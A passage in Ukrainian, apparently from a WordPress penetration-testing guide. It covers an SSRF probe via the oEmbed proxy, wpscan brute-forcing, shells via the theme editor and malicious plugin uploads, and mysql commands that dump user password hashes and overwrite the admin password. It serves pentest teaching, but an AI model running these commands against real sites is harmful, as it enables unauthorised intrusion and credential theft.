–¢–∞–∫–æ–∂, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫—É Wordpress), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö –∑ –≤–∏—Å–æ–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–º–∫–Ω—É—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç–∏–Ω–≥—É, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥—ñ—ó –∑ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–º —ñ–Ω—Ç–µ—Ä–≤–∞–ª–æ–º (–±–µ–∑ –≤–∏–∫–ª–∏–∫—É –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

–°–ø—Ä–æ–±—É–π—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ —ñ —Å–∞–π—Ç Worpress –º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –≤–∞—Å.

–û—Å—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –∫–æ–ª–∏ —Ü–µ –Ω–µ –ø—Ä–∞—Ü—é—î:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —ñ—Å–Ω—É—î **methodName: pingback.ping** –¥–ª—è —à–ª—è—Ö—É **/wp-json/oembed/1.0/proxy** —ñ, —è–∫—â–æ —ñ—Å–Ω—É—î, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—é—á–∏ –±—ñ—Ç

–ë—ñ–ª—å—à–µ –Ω—ñ–∂ —Ä–µ–∞–ª—å–Ω–∞ –∞—Ç–∞–∫–∞, —Ü–µ —Ü—ñ–∫–∞–≤—ñ—Å—Ç—å. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) –≤–∏ –º–æ–≥–ª–∏ –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç–∏ 1 –±—ñ—Ç –∑ –±—É–¥—å-—è–∫–æ–≥–æ —Ñ–∞–π–ª—É wordpress. –¢–æ–∂ –≤–∏ –º–æ–≥–ª–∏ –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç–∏ –ø–æ–∑–∏—Ü—ñ—é `5389` —Ñ–∞–π–ª—É `/var/www/html/wp-includes/user.php`, —â–æ–± NOP –æ–ø–µ—Ä–∞—Ü—ñ—é NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**–ó–º—ñ–Ω–∞ php –∑ —Ç–µ–º–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (–ø–æ—Ç—Ä—ñ–±–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞)**

–ó–æ–≤–Ω—ñ—à–Ω—ñ–π –≤–∏–≥–ª—è–¥ ‚Üí –†–µ–¥–∞–∫—Ç–æ—Ä —Ç–µ–º ‚Üí –®–∞–±–ª–æ–Ω 404 (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

–®—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ —Å—é–¥–∏: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP –ø–ª–∞–≥—ñ–Ω

–ú–æ–∂–ª–∏–≤–æ, —â–æ –º–æ–∂–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ .php —Ñ–∞–π–ª–∏ —è–∫ –ø–ª–∞–≥—ñ–Ω.\
–°—Ç–≤–æ—Ä—ñ—Ç—å —Å–≤—ñ–π php –±–µ–∫–¥–æ—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../images/image (183).png>)

–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π –ø–ª–∞–≥—ñ–Ω:

![](<../../images/image (722).png>)

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø–ª–∞–≥—ñ–Ω —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–∞—Ä–∞–∑:

![](<../../images/image (249).png>)

–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –ü—Ä–æ–¥–æ–≤–∂–∏—Ç–∏:

![](<../../images/image (70).png>)

–ô–º–æ–≤—ñ—Ä–Ω–æ, —Ü–µ –Ω—ñ—á–æ–≥–æ –Ω–µ –∑—Ä–æ–±–∏—Ç—å –Ω–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥, –∞–ª–µ —è–∫—â–æ –≤–∏ –ø–µ—Ä–µ–π–¥–µ—Ç–µ –¥–æ –ú–µ–¥—ñ–∞, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—É –æ–±–æ–ª–æ–Ω–∫—É:

![](<../../images/image (462).png>)

–î–æ—Å—Ç—É–ø –¥–æ –Ω–µ—ó, —ñ –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ URL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–µ–≤–µ—Ä—Å-–æ–±–æ–ª–æ–Ω–∫–∏:

![](<../../images/image (1006).png>)

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞

–¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î —É—Å—Ç–∞–Ω–æ–≤–∫—É —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞, –≤—ñ–¥–æ–º–æ–≥–æ —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, —è–∫–∏–π –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫–∏. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –ø–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è WordPress –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

1. **–û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**: –ü–ª–∞–≥—ñ–Ω –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ –¥–∂–µ—Ä–µ–ª–∞, —Ç–∞–∫–æ–≥–æ —è–∫ Exploit DB, —è–∫ [**—Ç—É—Ç**](https://www.exploit-db.com/exploits/36374).
2. **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**:
- –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –ø–∞–Ω–µ–ª—ñ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è WordPress, –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ `–ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è > –ü–ª–∞–≥—ñ–Ω–∏ > –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø–ª–∞–≥—ñ–Ω`.
- –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ zip-—Ñ–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞.
3. **–ê–∫—Ç–∏–≤–∞—Ü—ñ—è –ø–ª–∞–≥—ñ–Ω–∞**: –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–ª–∞–≥—ñ–Ω –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –ø–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è.
4. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**:
- –ó –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º —ñ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–º –ø–ª–∞–≥—ñ–Ω–æ–º "reflex-gallery" –π–æ–≥–æ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–¥–æ–º–æ, —â–æ –≤—ñ–Ω –≤—Ä–∞–∑–ª–∏–≤–∏–π.
- –§—Ä–µ–π–º–≤–æ—Ä–∫ Metasploit –Ω–∞–¥–∞—î –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –º–æ–¥—É–ª—å —ñ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Å–µ—Å—ñ—é meterpreter, —â–æ –Ω–∞–¥–∞—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–∞–π—Ç—É.
- –ó–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ —Ü–µ –ª–∏—à–µ –æ–¥–∏–Ω –∑ –±–∞–≥–∞—Ç—å–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å–∞–π—Ç—É WordPress.

–ó–º—ñ—Å—Ç –≤–∫–ª—é—á–∞—î –≤—ñ–∑—É–∞–ª—å–Ω—ñ –¥–æ–ø–æ–º—ñ–∂–Ω—ñ –º–∞—Ç–µ—Ä—ñ–∞–ª–∏, —â–æ —ñ–ª—é—Å—Ç—Ä—É—é—Ç—å –∫—Ä–æ–∫–∏ –≤ –ø–∞–Ω–µ–ª—ñ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è WordPress –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —Ç–∞ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ –ª–∏—à–µ –≤ –∑–∞–∫–æ–Ω–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è –∑ —è–≤–Ω–∏–º –¥–æ–∑–≤–æ–ª–æ–º.

**–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–∏—Ö –∫—Ä–æ–∫—ñ–≤ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## –í—ñ–¥ XSS –¥–æ RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ‚Äî —Ü–µ —Å–∫—Ä–∏–ø—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ **Cross-Site Scripting (XSS)** –¥–æ **Remote Code Execution (RCE)** –∞–±–æ —ñ–Ω—à–∏—Ö –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É WordPress. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**—Ü–µ–π –ø–æ—Å—Ç**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). –í—ñ–Ω –Ω–∞–¥–∞—î **–ø—ñ–¥—Ç—Ä–∏–º–∫—É –¥–ª—è –≤–µ—Ä—Å—ñ–π WordPress 6.X.X, 5.X.X —Ç–∞ 4.X.X —ñ –¥–æ–∑–≤–æ–ª—è—î:**
- _**–ï—Å–∫–∞–ª–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ WordPress.
- _**(RCE) –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞ (–±–µ–∫–¥–æ—Ä—É):**_ –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Å–≤—ñ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –ø–ª–∞–≥—ñ–Ω (–±–µ–∫–¥–æ—Ä) –¥–æ WordPress.
- _**(RCE) –†–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞:**_ –†–µ–¥–∞–≥—É–π—Ç–µ –≤–±—É–¥–æ–≤–∞–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ –≤ WordPress.
- _**(RCE) –†–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–æ—ó —Ç–µ–º–∏:**_ –†–µ–¥–∞–≥—É–π—Ç–µ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ç–µ–º–∏ –≤ WordPress.
- _**(–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π) –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏:**_ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º WordPress.

## –ü–æ—Å—Ç–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–í–∏—Ç—è–≥–Ω—ñ—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

–ó–Ω–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ –ø–ª–∞–≥—ñ–Ω Wordpress –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É –π–æ–≥–æ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏, —è–∫ –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —É –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—É–Ω–∫—Ç–∞—Ö —Ç–∞ –¥–µ—è–∫–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ —É [**—Ü—å–æ–º—É –±–ª–æ–∑—ñ**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω —ñ–∑ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è, - —Ü–µ —á–µ—Ä–µ–∑ AJAX –æ–±—Ä–æ–±–Ω–∏–∫–∏. –¶—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ª–æ–≥—ñ–∫—É, –ø–æ–º–∏–ª–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∞–±–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –¥–æ—Å–∏—Ç—å —á–∞—Å—Ç–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±–∞–∑—É—é—Ç—å —è–∫ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, —Ç–∞–∫ —ñ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –Ω–∞ —ñ—Å–Ω—É–≤–∞–Ω–Ω—ñ nonce Wordpress, —è–∫–∏–π **–±—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π —É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ Wordpress, –º–æ–∂–µ –º–∞—Ç–∏** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –π–æ–≥–æ —Ä–æ–ª—ñ).

–¶–µ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–ª–∞–≥—ñ–Ω—ñ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –¥–æ—Å—Ç—É–ø–Ω–æ—é –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —É–≤—ñ–π—à–æ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

- **REST API**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –µ–∫—Å–ø–æ–Ω—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ WordPress, —Ä–µ—î—Å—Ç—Ä—É—é—á–∏ REST API –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` - —Ü–µ –∑–≤–æ—Ä–æ—Ç–Ω–∏–π –≤–∏–∫–ª–∏–∫ –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –º–∞—î –¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø—Ä–∞–≤–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –º–µ—Ç–æ–¥ API.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **–ü—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ php —Ñ–∞–π–ª—É**

–ó–≤–∏—á–∞–π–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ—Å—Ç—É–ø–Ω—ñ –∑ –≤–µ–±—É. –û—Ç–∂–µ, —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±—É–¥—å-—è–∫—É –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–æ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ —Ñ–∞–π–ª—É, —Ü–µ –±—É–¥–µ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–æ –±—É–¥—å-—è–∫–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.

